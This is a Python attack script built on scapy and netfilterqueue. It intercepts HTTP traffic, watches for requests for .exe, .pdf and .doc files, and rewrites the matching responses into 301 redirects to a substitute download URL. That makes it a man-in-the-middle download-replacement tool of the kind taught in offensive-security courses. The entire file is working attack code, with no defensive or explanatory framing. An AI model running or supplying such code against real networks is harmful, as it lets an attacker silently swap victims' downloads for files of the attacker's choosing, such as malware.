#!/usr/bin/env python

import time
import scapy.all as scapy
import psutil
import threading
import netfilterqueue
import argparse
import sys
from scapy.layers import http
from scapy.layers.http import HTTPRequest
from scapy.layers.http import HTTPResponse
from termcolor import colored

ack_list = []

def proc_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload()) # convert packet payload to Scapy packet
    if scapy_packet.haslayer(HTTPRequest):
        keywords = [".exe", ".pdf", ".doc"]
        for keyword in keywords:
            if keyword.encode() in scapy_packet[HTTPRequest].Path:
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print("[+] " + keyword + " request")
                print(scapy_packet[HTTPRequest].Host + scapy_packet[HTTPRequest].Path)
                print(scapy_packet.show())
                if scapy_packet.haslayer(scapy.Raw):
                    print(scapy_packet[scapy.Raw].load)

    elif scapy_packet.haslayer(HTTPResponse):
        #print("HTTP Response")
        #print(scapy_packet.show())
        if scapy_packet[scapy.TCP].seq in ack_list:
            ack_list.remove(scapy_packet[scapy.TCP].seq)
            print("[+] Replacing file")
            print("HTTP Response")
            #print(scapy_packet.show())
            scapy_packet[HTTPResponse].Status_Code = b'301'
            scapy_packet[HTTPResponse].Reason_Phrase = b'Moved Permanently'
            scapy_packet[HTTPResponse].Location = b'https://www.rarlab.com/rar/winrar-x64-611.exe'

            # General packet cleanup to allow scapy to create checksums and lengths to packets
            del scapy_packet[scapy.IP].len # delete IP length data so scapy will recalculate the packetlenth in the response
            del scapy_packet[scapy.IP].chksum  # delete IP chksum data so scapy will recalculate the packetlenth in the response
            del scapy_packet[scapy.TCP].chksum  # delete TCP chksum data so scapy will recalculate the packetlenth in the response
            packet.set_payload(bytes(scapy_packet)) # set packet payload to manipulated scapy packet
            print(scapy_packet.show())
    packet.accept() # forward packet to target


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, proc_packet)
queue.run()